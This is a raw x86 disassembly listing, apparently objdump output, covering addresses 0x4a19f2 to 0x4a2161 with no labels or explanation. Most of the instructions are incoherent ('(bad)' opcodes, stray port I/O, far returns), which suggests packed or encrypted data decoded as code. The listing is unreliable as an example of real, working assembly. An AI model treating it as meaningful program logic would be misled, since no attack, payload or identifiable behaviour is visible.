  4a19f2:	push   cs
  4a19f3:	and    DWORD PTR [eax],ebx
  4a19f5:	push   0x1c
  4a19f7:	sahf   
  4a19f8:	inc    ebx
  4a19f9:	dec    eax
  4a19fa:	gs pushf 
  4a19fc:	sbb    eax,0x101e6b20
  4a1a01:	push   edx
  4a1a02:	sbb    DWORD PTR [edx-0x5c],eax
  4a1a05:	pop    ds
  4a1a06:	push   esp
  4a1a07:	xchg   BYTE PTR [eax+0x206c28e7],dl
  4a1a0d:	lods   al,BYTE PTR ds:[esi]
  4a1a0e:	and    DWORD PTR [ecx],esp
  4a1a10:	in     al,0x39
  4a1a12:	test   BYTE PTR [eax],dh
  4a1a14:	ins    DWORD PTR es:[edi],dx
  4a1a15:	and    bh,BYTE PTR [ecx+0xe]
  4a1a18:	and    DWORD PTR [ebp+0x6e3823b4],edx
  4a1a1e:	and    al,0x43
  4a1a20:	dec    eax
  4a1a21:	or     BYTE PTR gs:[ebp+eiz*1+0x42195240],bh
  4a1a29:	sahf   
  4a1a2a:	outs   dx,DWORD PTR ds:[esi]
  4a1a2b:	les    esp,FWORD PTR es:[edi]
  4a1a2e:	xchg   BYTE PTR [eax+0x704810e7],dl
  4a1a34:	sub    ah,cl
  4a1a36:	in     al,0x39
  4a1a38:	test   BYTE PTR [ecx+ebp*1+0x50],dl
  4a1a3c:	jno    0x4a1a68
  4a1a3e:	push   cs
  4a1a3f:	and    DWORD PTR [ebp+0x582bd421],edx
  4a1a45:	jb     0x4a1a8f
  4a1a47:	or     BYTE PTR gs:[ecx+0x2c],bh
  4a1a4b:	fsubr  QWORD PTR ds:0x439e4219
  4a1a51:	pusha  
  4a1a52:	jae    0x4a1a82
  4a1a54:	in     al,0x90
  4a1a56:	out    0x10,eax
  4a1a58:	push   edx
  4a1a59:	das    
  4a1a5a:	push   0x84393074
  4a1a5f:	push   esp
  4a1a60:	xchg   ah,ch
  4a1a62:	xor    DWORD PTR [eax+0x75],esi
  4a1a65:	and    DWORD PTR [ebp-0xbcd1bdf],edx
  4a1a6b:	xor    esp,DWORD PTR [ebp+0x8]
  4a1a6e:	jns    0x4a1a7e
  4a1a70:	js     0x4a1ae8
  4a1a72:	xor    al,0xfc
  4a1a74:	inc    edx
  4a1a75:	sahf   
  4a1a76:	inc    ebx
  4a1a77:	dec    eax
  4a1a78:	xor    eax,0xca367780
  4a1a7d:	adc    dl,dh
  4a1a7f:	sbb    al,0x4
  4a1a81:	js     0x4a1aba
  4a1a83:	mov    BYTE PTR [esp+edi*1+0xc389087],al
  4a1a8a:	jns    0x4a1ac5
  4a1a8c:	iret   
  4a1a8d:	and    DWORD PTR [edx+esi*1+0x7a143a90],esp
  4a1a94:	cmp    ecx,DWORD PTR [eax]
  4a1a96:	test   eax,0x3c98210c
  4a1a9b:	sub    al,BYTE PTR [ebx-0x38]
  4a1a9e:	jae    0x4a1abc
  4a1aa0:	jnp    0x4a1adf
  4a1aa2:	mov    al,ds:0x1cf2103e
  4a1aa7:	inc    edx
  4a1aa8:	and    al,0x7c
  4a1aaa:	aas    
  4a1aab:	xor    eax,esp
  4a1aad:	test   dl,cl
  4a1aaf:	test   al,0x40
  4a1ab1:	(bad)  
  4a1ab2:	jge    0x4a1a38
  4a1ab4:	xor    al,0x43
  4a1ab6:	dec    eax
  4a1ab7:	inc    ecx
  4a1ab8:	jge    0x4a1afc
  4a1aba:	xor    al,0x43
  4a1abc:	dec    eax
  4a1abd:	xor    edi,DWORD PTR [esi+0x43]
  4a1ac0:	jle    0x4a1b06
  4a1ac2:	inc    ebx
  4a1ac3:	dec    eax
  4a1ac4:	xor    eax,DWORD PTR [edi+edi*2+0x33487f45]
  4a1acb:	test   BYTE PTR [esi+eax*2],dh
  4a1ace:	add    BYTE PTR [edi+0x33],0x84
  4a1ad2:	xor    al,0x43
  4a1ad4:	or     BYTE PTR [eax-0x7f],0x84
  4a1ad8:	xor    al,0x43
  4a1ada:	dec    eax
  4a1adb:	dec    ecx
  4a1adc:	or     DWORD PTR [edx+0x34],0x82334843
  4a1ae3:	dec    ebx
  4a1ae4:	or     BYTE PTR [ebx+eax*2+0x48],0x33
  4a1ae9:	test   BYTE PTR [ebx+0x3348834d],al
  4a1aef:	test   BYTE PTR [esi+ecx*2],dh
  4a1af2:	test   BYTE PTR [edi+0x33],cl
  4a1af5:	test   BYTE PTR [ebx+eax*2],dh
  4a1af8:	test   BYTE PTR [eax-0x7b],dl
  4a1afb:	test   BYTE PTR [ebx+eax*2],dh
  4a1afe:	dec    eax
  4a1aff:	push   ecx
  4a1b00:	test   DWORD PTR [edx+0x34],edx
  4a1b03:	inc    ebx
  4a1b04:	dec    eax
  4a1b05:	xor    eax,DWORD PTR [esi+0x43548653]
  4a1b0b:	dec    eax
  4a1b0c:	xor    eax,DWORD PTR [edi+eax*4+0x33488855]
  4a1b13:	test   BYTE PTR [esi+edx*2],dh
  4a1b16:	mov    BYTE PTR [edi+0x33],dl
  4a1b19:	test   BYTE PTR [ebx+eax*2],dh
  4a1b1c:	mov    DWORD PTR [eax-0x77],ebx
  4a1b1f:	test   BYTE PTR [ebx+eax*2],dh
  4a1b22:	dec    eax
  4a1b23:	pop    ecx
  4a1b24:	mov    bl,BYTE PTR [edx+0x34]
  4a1b27:	inc    ebx
  4a1b28:	dec    eax
  4a1b29:	xor    ecx,DWORD PTR [edx+0x435c8b5b]
  4a1b2f:	dec    eax
  4a1b30:	xor    eax,DWORD PTR [ebx+ecx*4+0x33488c5d]
  4a1b37:	test   BYTE PTR [esi+ebx*2],dh
  4a1b3a:	mov    WORD PTR [edi+0x33],ds
  4a1b3d:	test   BYTE PTR [ebx+eax*2],dh
  4a1b40:	lea    esp,[eax-0x73]
  4a1b43:	test   BYTE PTR [ebx+eax*2],dh
  4a1b46:	dec    eax
  4a1b47:	popa   
  4a1b48:	mov    fs,WORD PTR [edx+0x34]
  4a1b4b:	inc    ebx
  4a1b4c:	dec    eax
  4a1b4d:	xor    ecx,DWORD PTR [esi+0x43648f63]
  4a1b53:	dec    eax
  4a1b54:	xor    eax,DWORD PTR [edi+ecx*4+0x33489065]
  4a1b5b:	test   BYTE PTR [esi+eiz*2],dh
  4a1b5e:	nop
  4a1b5f:	xor    eax,DWORD PTR [si+0x4334]
  4a1b64:	xchg   ecx,eax
  4a1b65:	push   0x43348491
  4a1b6a:	dec    eax
  4a1b6b:	imul   edx,DWORD PTR [edx+0x4843346a],0x936b9233
  4a1b75:	ins    BYTE PTR es:[edi],dx
  4a1b76:	inc    ebx
  4a1b77:	dec    eax
  4a1b78:	xor    eax,DWORD PTR [ebx+edx*4+0x3348946d]
  4a1b7f:	test   BYTE PTR [esi+ebp*2],dh
  4a1b82:	xchg   esp,eax
  4a1b83:	outs   dx,DWORD PTR ds:[esi]
  4a1b84:	xor    eax,DWORD PTR [esp+esi*1-0x6a8f6abd]
  4a1b8b:	test   BYTE PTR [ebx+eax*2],dh
  4a1b8e:	dec    eax
  4a1b8f:	jno    0x4a1b27
  4a1b91:	jb     0x4a1bc7
  4a1b93:	inc    ebx
  4a1b94:	dec    eax
  4a1b95:	xor    edx,DWORD PTR [esi+0x43749773]
  4a1b9b:	dec    eax
  4a1b9c:	xor    eax,DWORD PTR [edi+edx*4+0x33489875]
  4a1ba3:	test   BYTE PTR [esi+esi*2],dh
  4a1ba6:	cdq    
  4a1ba7:	ja     0x4a1bdc
  4a1ba9:	test   BYTE PTR [ebx+eax*2],dh
  4a1bac:	cdq    
  4a1bad:	js     0x4a1b49
  4a1baf:	test   BYTE PTR [ebx+eax*2],dh
  4a1bb2:	dec    eax
  4a1bb3:	jns    0x4a1b4f
  4a1bb5:	jp     0x4a1beb
  4a1bb7:	inc    ebx
  4a1bb8:	dec    eax
  4a1bb9:	xor    ebx,DWORD PTR [ebx+0x437c9b7b]
  4a1bbf:	dec    eax
  4a1bc0:	xor    eax,DWORD PTR [esp+ebx*4+0x33489c7d]
  4a1bc7:	test   BYTE PTR [esi+edi*2],dh
  4a1bca:	popf   
  4a1bcb:	jg     0x4a1c00
  4a1bcd:	test   BYTE PTR [ebx+eax*2],dh
  4a1bd0:	popf   
  4a1bd1:	sbb    BYTE PTR [esi+0x48433484],0x81
  4a1bd8:	sahf   
  4a1bd9:	xor    BYTE PTR [ebx+eax*2],0x48
  4a1bdd:	xor    ebx,DWORD PTR [edi+0x43849f83]
  4a1be3:	dec    eax
  4a1be4:	xor    eax,DWORD PTR [eax+eiz*4+0x3348a085]
  4a1beb:	test   BYTE PTR [esi+eax*4],dh
  4a1bee:	mov    eax,ds:0x34843387
  4a1bf3:	inc    ebx
  4a1bf4:	mov    eax,ds:0x3484a288
  4a1bf9:	inc    ebx
  4a1bfa:	dec    eax
  4a1bfb:	mov    DWORD PTR [edx+0x4843348a],esp
  4a1c01:	xor    esp,DWORD PTR [ebx+0x438ca38b]
  4a1c07:	dec    eax
  4a1c08:	xor    eax,DWORD PTR [esp+eiz*4+0x3348a48d]
  4a1c0f:	test   BYTE PTR [esi+ecx*4],dh
  4a1c12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a1c13:	(bad)  
  4a1c14:	xor    eax,DWORD PTR [esp+esi*1-0x596f5abd]
  4a1c1b:	test   BYTE PTR [ebx+eax*2],dh
  4a1c1e:	dec    eax
  4a1c1f:	xchg   ecx,eax
  4a1c20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a1c21:	xchg   edx,eax
  4a1c22:	xor    al,0x43
  4a1c24:	dec    eax
  4a1c25:	xor    esp,DWORD PTR [edi+0x4394a793]
  4a1c2b:	dec    eax
  4a1c2c:	xor    eax,DWORD PTR [eax+ebp*4+0x3348a995]
  4a1c33:	test   BYTE PTR [esi+edx*4],dh
  4a1c36:	test   eax,0x34843397
  4a1c3b:	inc    ebx
  4a1c3c:	stos   BYTE PTR es:[edi],al
  4a1c3d:	cwde   
  4a1c3e:	stos   BYTE PTR es:[edi],al
  4a1c3f:	test   BYTE PTR [ebx+eax*2],dh
  4a1c42:	dec    eax
  4a1c43:	cdq    
  4a1c44:	stos   DWORD PTR es:[edi],eax
  4a1c45:	call   0x9bab:0x33484334
  4a1c4c:	lods   al,BYTE PTR ds:[esi]
  4a1c4d:	pushf  
  4a1c4e:	inc    ebx
  4a1c4f:	dec    eax
  4a1c50:	xor    eax,DWORD PTR [esp+ebp*4+0x3348ad9d]
  4a1c57:	test   BYTE PTR [esi+ebx*4],dh
  4a1c5a:	lods   eax,DWORD PTR ds:[esi]
  4a1c5b:	lahf   
  4a1c5c:	xor    eax,DWORD PTR [esp+esi*1-0x515f51bd]
  4a1c63:	test   BYTE PTR [ebx+eax*2],dh
  4a1c66:	dec    eax
  4a1c67:	mov    eax,ds:0x4334a2af
  4a1c6c:	dec    eax
  4a1c6d:	xor    ebp,DWORD PTR [edi+0x43a4b0a3]
  4a1c73:	dec    eax
  4a1c74:	xor    eax,DWORD PTR [eax+esi*4+0x3348b1a5]
  4a1c7b:	test   BYTE PTR [esi+eiz*4],dh
  4a1c7e:	mov    cl,0xa7
  4a1c80:	xor    eax,DWORD PTR [esp+esi*1-0x4d574dbd]
  4a1c87:	test   BYTE PTR [ebx+eax*2],dh
  4a1c8a:	dec    eax
  4a1c8b:	test   eax,0x4334aab3
  4a1c90:	dec    eax
  4a1c91:	xor    esi,DWORD PTR [ebx+0x43acb4ab]
  4a1c97:	dec    eax
  4a1c98:	xor    eax,DWORD PTR [esp+esi*4+0x3348b5ad]
  4a1c9f:	test   BYTE PTR [esi+ebp*4],dh
  4a1ca2:	mov    ch,0xaf
  4a1ca4:	xor    eax,DWORD PTR [esp+esi*1-0x494f49bd]
  4a1cab:	test   BYTE PTR [ebx+eax*2],dh
  4a1cae:	dec    eax
  4a1caf:	mov    cl,0xb7
  4a1cb1:	mov    dl,0x34
  4a1cb3:	inc    ebx
  4a1cb4:	dec    eax
  4a1cb5:	xor    esi,DWORD PTR [edi+0x43b4b8b3]
  4a1cbb:	dec    eax
  4a1cbc:	xor    eax,DWORD PTR [eax+edi*4+0x3348b9b5]
  4a1cc3:	test   BYTE PTR [esi+esi*4],dh
  4a1cc6:	mov    edx,0x348433b7
  4a1ccb:	inc    ebx
  4a1ccc:	mov    edx,0x3484bbb8
  4a1cd1:	inc    ebx
  4a1cd2:	dec    eax
  4a1cd3:	mov    ecx,0x4334babb
  4a1cd8:	dec    eax
  4a1cd9:	xor    edi,DWORD PTR [ebx+edi*4+0x4843bcbc]
  4a1ce0:	xor    eax,DWORD PTR [ebp+edi*4+0x3348bdbd]
  4a1ce7:	test   BYTE PTR [esi+edi*4],dh
  4a1cea:	mov    esi,0x348433bf
  4a1cef:	inc    ebx
  4a1cf0:	mov    esi,0x3484bfc0
  4a1cf5:	inc    ebx
  4a1cf6:	dec    eax
  4a1cf7:	sar    DWORD PTR [edi+0x484334c2],0x33
  4a1cfe:	rol    bl,0xc0
  4a1d01:	les    eax,FWORD PTR [ebx+0x48]
  4a1d04:	xor    eax,DWORD PTR [ecx+eax*8+0x3348c1c5]
  4a1d0b:	test   BYTE PTR [esi+eax*8],dh
  4a1d0e:	ret    0x33c7
  4a1d11:	test   BYTE PTR [ebx+eax*2],dh
  4a1d14:	ret    0xc3c8
  4a1d17:	test   BYTE PTR [ebx+eax*2],dh
  4a1d1a:	dec    eax
  4a1d1b:	leave  
  4a1d1c:	ret    
  4a1d1d:	retf   0x4334
  4a1d20:	dec    eax
  4a1d21:	xor    eax,esp
  4a1d23:	retf   
  4a1d24:	(bad)  
  4a1d25:	int3   
  4a1d26:	inc    ebx
  4a1d27:	dec    eax
  4a1d28:	xor    eax,DWORD PTR [ebp+eax*8+0x3348c5cd]
  4a1d2f:	test   BYTE PTR [esi+ecx*8],dh
  4a1d32:	(bad)  
  4a1d33:	iret   
  4a1d34:	xor    eax,DWORD PTR [esp+esi*1-0x382f39bd]
  4a1d3b:	test   BYTE PTR [ebx+eax*2],dh
  4a1d3e:	dec    eax
  4a1d3f:	rol    edi,1
  4a1d41:	shl    BYTE PTR [ebx+eax*2],cl
  4a1d44:	dec    eax
  4a1d45:	xor    ecx,eax
  4a1d47:	ror    eax,cl
  4a1d49:	aam    0x43
  4a1d4b:	dec    eax
  4a1d4c:	xor    eax,DWORD PTR [ecx+ecx*8+0x3348cad5]
  4a1d53:	test   BYTE PTR [esi+edx*8],dh
  4a1d56:	retf   0x33d7
  4a1d59:	test   BYTE PTR [ebx+eax*2],dh
  4a1d5c:	retf   
  4a1d5d:	fmul   st,st(3)
  4a1d5f:	test   BYTE PTR [ebx+eax*2],dh
  4a1d62:	dec    eax
  4a1d63:	fxch   st(4)
  4a1d65:	fidiv  DWORD PTR [ebx+eax*2]
  4a1d68:	dec    eax
  4a1d69:	xor    ecx,esp
  4a1d6b:	fcmovne st,st(5)
  4a1d6d:	fadd   QWORD PTR [ebx+0x48]
  4a1d70:	xor    eax,DWORD PTR [ebp+ecx*8+0x3348cedd]
  4a1d77:	test   BYTE PTR [esi+ebx*8],dh
  4a1d7a:	into   
  4a1d7b:	fbstp  TBYTE PTR [ebx]
  4a1d7d:	test   BYTE PTR [ebx+eax*2],dh
  4a1d80:	iret   
  4a1d81:	loopne 0x4a1d52
  4a1d83:	test   BYTE PTR [ebx+eax*2],dh
  4a1d86:	dec    eax
  4a1d87:	loope  0x4a1d59
  4a1d89:	loop   0x4a1dbf
  4a1d8b:	inc    ebx
  4a1d8c:	dec    eax
  4a1d8d:	xor    edx,eax
  4a1d8f:	jecxz  0x4a1d62
  4a1d91:	in     al,0x43
  4a1d93:	dec    eax
  4a1d94:	xor    eax,DWORD PTR [ecx+edx*8+0x3348d2e5]
  4a1d9b:	test   BYTE PTR [esi+eiz*8],dh
  4a1d9e:	shl    bh,cl
  4a1da0:	sbb    DWORD PTR [eax+ecx*1+0x43],0x3c04fed3
  4a1da8:	pop    ss
  4a1da9:	enter  0xd373,0x4
  4a1dad:	aam    0x4
  4a1daf:	pop    ss
  4a1db0:	enter  0x8173,0xd4
  4a1db4:	add    al,0xd5
  4a1db6:	enter  0x8173,0x3c
  4a1dba:	add    al,0xd5
  4a1dbc:	add    al,0x73
  4a1dbe:	cmp    DWORD PTR [edi+edx*1],0x81d604d6
  4a1dc5:	cmp    al,0x17
  4a1dc7:	enter  0xd704,0x4
  4a1dcb:	cmp    al,0x17
  4a1dcd:	enter  0xd773,0x4
  4a1dd1:	fadd   DWORD PTR [edi+edx*1]
  4a1dd4:	enter  0x8173,0xd8
  4a1dd8:	add    al,0xd9
  4a1dda:	enter  0x8173,0x3c
  4a1dde:	add    al,0xd9
  4a1de0:	add    al,0x73
  4a1de2:	cmp    DWORD PTR [edi+edx*1],0x81db04da
  4a1de9:	cmp    al,0x17
  4a1deb:	enter  0xdb04,0x4
  4a1def:	cmp    al,0x17
  4a1df1:	enter  0xdc73,0x4
  4a1df5:	fadd   QWORD PTR [edi+edx*1]
  4a1df8:	enter  0x8173,0xdd
  4a1dfc:	add    al,0xdd
  4a1dfe:	enter  0x8173,0x3c
  4a1e02:	add    al,0xde
  4a1e04:	add    al,0x73
  4a1e06:	cmp    DWORD PTR [edi+edx*1],0x81df04de
  4a1e0d:	cmp    al,0x17
  4a1e0f:	enter  0xdf04,0x5
  4a1e13:	cmp    al,0x17
  4a1e15:	enter  0xe073,0x5
  4a1e19:	loopne 0x4a1e20
  4a1e1b:	pop    ss
  4a1e1c:	enter  0x8173,0xe1
  4a1e20:	add    eax,0x8173c8e1
  4a1e25:	cmp    al,0x5
  4a1e27:	loop   0x4a1e2e
  4a1e29:	jae    0x4a1dac
  4a1e2b:	cmp    al,0x17
  4a1e2d:	loop   0x4a1e34
  4a1e2f:	jecxz  0x4a1db2
  4a1e31:	cmp    al,0x17
  4a1e33:	enter  0xe305,0x5
  4a1e37:	cmp    al,0x17
  4a1e39:	enter  0xe473,0x5
  4a1e3d:	in     al,0x5
  4a1e3f:	pop    ss
  4a1e40:	enter  0x8173,0xe5
  4a1e44:	add    eax,0x8173c8e5
  4a1e49:	cmp    al,0x5
  4a1e4b:	out    0x5,al
  4a1e4d:	jae    0x4a1dd0
  4a1e4f:	cmp    al,0x17
  4a1e51:	out    0x5,al
  4a1e53:	out    0x81,eax
  4a1e55:	cmp    al,0x17
  4a1e57:	enter  0xe705,0x5
  4a1e5b:	cmp    al,0x17
  4a1e5d:	enter  0xe873,0x5
  4a1e61:	call   0x7412356b
  4a1e66:	sub    ecx,0x73c8e905
  4a1e6c:	cmp    DWORD PTR [eax*1-0x7e8cfa16],0x5eb173c
  4a1e77:	jmp    0x4a1dfa
  4a1e79:	cmp    al,0x17
  4a1e7b:	enter  0xec05,0x5
  4a1e7f:	cmp    al,0x17
  4a1e81:	enter  0xec73,0x5
  4a1e85:	in     eax,dx
  4a1e86:	add    eax,0x8173c817
  4a1e8b:	in     eax,dx
  4a1e8c:	add    eax,0x8173c8ee
  4a1e91:	cmp    al,0x5
  4a1e93:	out    dx,al
  4a1e94:	add    eax,0x173c8173
  4a1e99:	out    dx,eax
  4a1e9a:	add    eax,0x173c81ef
  4a1e9f:	enter  0xf005,0x5
  4a1ea3:	cmp    al,0x17
  4a1ea5:	enter  0xf073,0x5
  4a1ea9:	icebp  
  4a1eaa:	add    eax,0x8173c817
  4a1eaf:	icebp  
  4a1eb0:	add    eax,0x8173c8f2
  4a1eb5:	cmp    al,0x5
  4a1eb7:	repnz add eax,0x173c8173
  4a1ebd:	repz add eax,0x173c81f3
  4a1ec3:	enter  0xf405,0x5
  4a1ec7:	cmp    al,0x17
  4a1ec9:	enter  0xf473,0x5
  4a1ecd:	cmc    
  4a1ece:	add    eax,0x8173c817
  4a1ed3:	cmc    
  4a1ed4:	add    eax,0x8173c8f6
  4a1ed9:	cmp    al,0x5
  4a1edb:	test   BYTE PTR ds:0x173c8173,0xf7
  4a1ee2:	add    eax,0x173c81f7
  4a1ee7:	enter  0xf805,0x5
  4a1eeb:	jns    0x4a1f04
  4a1eed:	enter  0xf873,0x5
  4a1ef1:	stc    
  4a1ef2:	cmp    dh,BYTE PTR [edx]
  4a1ef4:	inc    ebx
  4a1ef5:	enter  0x867,0xf4
  4a1ef9:	push   0x19527833
  4a1efe:	inc    edx
  4a1eff:	sahf   
  4a1f00:	cli    
  4a1f01:	xor    al,0xfc
  4a1f03:	xor    eax,0x10e79087
  4a1f08:	cmp    bl,0x36
  4a1f0b:	add    al,0xfc
  4a1f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a1f0e:	xor    al,BYTE PTR [esp+edi*1+0xc388837]
  4a1f15:	and    edi,ecx
  4a1f17:	and    DWORD PTR [edi*8+0x73c89039],ecx
  4a1f1e:	or     BYTE PTR [ecx+0x3bfe143a],ch
  4a1f24:	sbb    al,0x42
  4a1f26:	sub    al,BYTE PTR [ebx-0x68]
  4a1f29:	cmp    al,0x1c
  4a1f2b:	call   DWORD PTR [eax+0x3df210ca]
  4a1f31:	mov    al,ds:0x9a42193e
  4a1f36:	xchg   DWORD PTR [eax+eax*1],esp
  4a1f39:	inc    ebx
  4a1f3a:	aas    
  4a1f3b:	test   al,0x90
  4a1f3d:	out    0x10,eax
  4a1f3f:	push   edx
  4a1f40:	inc    eax
  4a1f41:	sub    al,0x1
  4a1f43:	inc    ecx
  4a1f44:	cmp    DWORD PTR [esp+edx*2+0x3442b086],eax
  4a1f4b:	add    ah,BYTE PTR [ecx]
  4a1f4d:	xchg   ebp,eax
  4a1f4e:	and    esp,esp
  4a1f50:	inc    ebx
  4a1f51:	mov    eax,0x79086544
  4a1f56:	push   cs
  4a1f57:	cmp    al,0x3
  4a1f59:	inc    ebp
  4a1f5a:	rol    BYTE PTR [edx-0x62],0x43
  4a1f5e:	dec    eax
  4a1f5f:	inc    esi
  4a1f60:	inc    esp
  4a1f61:	add    al,0x47
  4a1f63:	out    0x10,eax
  4a1f65:	push   edx
  4a1f66:	sbb    eax,ecx
  4a1f68:	dec    eax
  4a1f69:	dec    esp
  4a1f6a:	add    eax,0x90865484
  4a1f6f:	dec    ecx
  4a1f70:	ror    BYTE PTR [edx-0x6b],1
  4a1f73:	and    esp,esp
  4a1f75:	cmp    DWORD PTR [esi+eax*1+0x4b],edx
  4a1f79:	fmul   DWORD PTR [eax+ecx*1+0x79]
  4a1f7d:	push   cs
  4a1f7e:	and    DWORD PTR [edi+eax*1+0x4d],ebx
  4a1f82:	sahf   
  4a1f83:	inc    ebx
  4a1f84:	dec    eax
  4a1f85:	gs loopne 0x4a1fd6
  4a1f88:	or     BYTE PTR fs:[edi+0x10],cl
  4a1f8c:	push   edx
  4a1f8d:	sbb    DWORD PTR [edx-0x18],eax
  4a1f90:	push   eax
  4a1f91:	push   esp
  4a1f92:	xchg   BYTE PTR [eax+0x51096ce7],dl
  4a1f98:	lock push edx
  4a1f9a:	and    esp,esp
  4a1f9c:	cmp    DWORD PTR [esp+esi*2+0xe79530a],eax
  4a1fa3:	and    DWORD PTR [ebp+0xb7c54f8],edx
  4a1fa9:	push   ebp
  4a1faa:	inc    ebx
  4a1fab:	enter  0x873,0x0
  4a1faf:	or     al,0x56
  4a1fb1:	test   dl,dh
  4a1fb3:	sbb    al,0x42
  4a1fb5:	sub    dl,BYTE PTR [edi+0x8]
  4a1fb8:	or     eax,0xca908758
  4a1fbd:	adc    BYTE PTR [ecx+ebx*2+0x32a40e10],cl
  4a1fc4:	test   BYTE PTR [edx+ebx*2],bh
  4a1fc7:	xchg   esp,eax
  4a1fc8:	pop    ebx
  4a1fc9:	or     al,0x21
  4a1fcb:	iret   
  4a1fcc:	and    DWORD PTR [eax],ebx
  4a1fce:	subps  xmm3,XMMWORD PTR [eax+ecx*8+0x5da90873]
  4a1fd6:	and    BYTE PTR [eax],dl
  4a1fd8:	pop    esi
  4a1fd9:	sbb    al,0x42
  4a1fdb:	sub    al,BYTE PTR [ebx-0x5c]
  4a1fde:	pop    edi
  4a1fdf:	sub    BYTE PTR [ecx],dl
  4a1fe1:	nop
  4a1fe2:	retf   0xf210
  4a1fe5:	pusha  
  4a1fe6:	lods   al,BYTE PTR ds:[esi]
  4a1fe7:	popa   
  4a1fe8:	xor    al,BYTE PTR [esp+edi*1+0x62123087]
  4a1fef:	mov    ah,0x21
  4a1ff1:	iret   
  4a1ff2:	and    DWORD PTR [ebx+eiz*2+0x73641338],esp
  4a1ff9:	or     BYTE PTR [ecx+0x4065bc0c],ch
  4a1fff:	adc    al,0x42
  4a2001:	sub    al,BYTE PTR [ebx-0x38]
  4a2004:	les    sp,DWORD PTR [edi-0x36]
  4a2008:	adc    dl,dh
  4a200a:	sbb    al,0x48
  4a200c:	adc    eax,0x3c84cc68
  4a2011:	xchg   DWORD PTR [eax+0x6a165069],edx
  4a2017:	iret   
  4a2018:	and    DWORD PTR [edx+esi*1+0x17586bd4],esp
  4a201f:	ins    BYTE PTR es:[edi],dx
  4a2020:	or     BYTE PTR [ecx+0x6ddc210c],ch
  4a2026:	sub    al,BYTE PTR [ebx-0x38]
  4a2029:	jae    0x4a208b
  4a202b:	sbb    BYTE PTR [esi-0x1c],ch
  4a202e:	outs   dx,DWORD PTR ds:[esi]
  4a202f:	adc    dl,dh
  4a2031:	sbb    al,0x42
  4a2033:	push   0x873c7019
  4a2038:	nop
  4a2039:	retf   0x71ec
  4a203c:	jo     0x4a2058
  4a203e:	jb     0x4a2061
  4a2040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a2041:	xor    al,BYTE PTR [esp+esi*8+0x210ca973]
  4a2048:	iret   
  4a2049:	js     0x4a2066
  4a204b:	je     0x4a2049
  4a204d:	jne    0x4a2092
  4a204f:	enter  0x873,0x80
  4a2053:	sbb    al,0x76
  4a2055:	add    al,0x52
  4a2057:	sbb    DWORD PTR [edx-0x62],eax
  4a205a:	sbb    eax,0x86788877
  4a205f:	nop
  4a2060:	out    0x10,eax
  4a2062:	or     al,0x1e
  4a2064:	jns    0x4a1ff6
  4a2066:	in     al,0x39
  4a2068:	test   BYTE PTR [edx+edi*2+0x14],dl
  4a206c:	pop    ds
  4a206d:	jnp    0x4a207d
  4a206f:	and    DWORD PTR [ebp+0x1c7c9821],edx
  4a2075:	and    BYTE PTR [eax+0x65],cl
  4a2078:	or     BYTE PTR [ecx+0x7d],bh
  4a207b:	mov    al,ds:0x9e42197e
  4a2080:	inc    ebx
  4a2081:	and    al,0x21
  4a2083:	jg     0x4a202d
  4a2085:	nop
  4a2086:	out    0x10,eax
  4a2088:	push   edx
  4a2089:	sub    BYTE PTR [edx+eiz*1],0x81
  4a208d:	cmp    DWORD PTR [esp+edx*2+0x3482b086],eax
  4a2094:	and    esp,DWORD PTR [ecx]
  4a2096:	xchg   ebp,eax
  4a2097:	and    esp,esp
  4a2099:	cmp    DWORD PTR [eax+0x79086584],0xe
  4a20a0:	cmp    al,0x24
  4a20a2:	test   eax,eax
  4a20a4:	inc    edx
  4a20a5:	sahf   
  4a20a6:	inc    ebx
  4a20a7:	dec    eax
  4a20a8:	xchg   BYTE PTR [ebp+eiz*1-0x79],al
  4a20ac:	out    0x10,eax
  4a20ae:	push   edx
  4a20af:	sbb    eax,ecx
  4a20b1:	mov    BYTE PTR [esi+eiz*1-0x7c],cl
  4a20b5:	push   esp
  4a20b6:	xchg   BYTE PTR [eax-0x6a752f77],dl
  4a20bc:	and    esp,esp
  4a20be:	cmp    DWORD PTR [edi+eiz*1-0x75],edx
  4a20c2:	fmul   DWORD PTR [eax+ecx*1+0x5c210e79]
  4a20c9:	sub    BYTE PTR [ebp+0x6548439e],cl
  4a20cf:	loopne 0x4a205f
  4a20d1:	sub    DWORD PTR fs:[edi+0x42195210],ecx
  4a20d8:	call   0x90d0756d
  4a20dd:	out    0x6c,eax
  4a20df:	sub    dl,BYTE PTR [ecx-0x1bde6d10]
  4a20e5:	cmp    DWORD PTR [esp+esi*2+0xe79932b],eax
  4a20ec:	and    DWORD PTR [ebp+0x2c7c94f8],edx
  4a20f2:	xchg   ebp,eax
  4a20f3:	inc    ebx
  4a20f4:	enter  0x873,0x0
  4a20f8:	sub    eax,0x1cf28496
  4a20fd:	inc    edx
  4a20fe:	sub    dl,BYTE PTR [edi-0x7867d1f8]
  4a2104:	nop
  4a2105:	retf   0x8c10
  4a2108:	cdq    
  4a2109:	adc    BYTE PTR [edi],ch
  4a210b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a210c:	xor    al,BYTE PTR [esp+edi*1+0xc9b949a]
  4a2113:	and    edi,ecx
  4a2115:	and    DWORD PTR [eax],ebx
  4a2117:	xor    BYTE PTR [esp+ebx*4-0x56f78c38],bl
  4a211e:	popf   
  4a211f:	and    BYTE PTR [ecx],dh
  4a2121:	sahf   
  4a2122:	sbb    al,0x42
  4a2124:	sub    al,BYTE PTR [ebx-0x5c]
  4a2127:	lahf   
  4a2128:	sub    BYTE PTR [edx],dh
  4a212a:	nop
  4a212b:	retf   0xf210
  4a212e:	mov    al,ds:0x8432a1ac
  4a2133:	cmp    al,0x87
  4a2135:	xor    BYTE PTR [ebx],dh
  4a2137:	mov    ds:0x21cf21b4,al
  4a213c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a213d:	mov    ds:0x73a43438,eax
  4a2142:	or     BYTE PTR [ecx+0x40a5bc0c],ch
  4a2148:	xor    eax,0xc8432a42
  4a214d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a214e:	les    esp,FWORD PTR [edi+0x1cf210ca]
  4a2154:	dec    eax
  4a2155:	ss test al,0xcc
  4a2158:	test   BYTE PTR [edi+eax*4],bh
  4a215b:	nop
  4a215c:	test   eax,0xcfaa3750
  4a2161:	and    DWORD PTR [edx+esi*1+0x3858abd4],esp
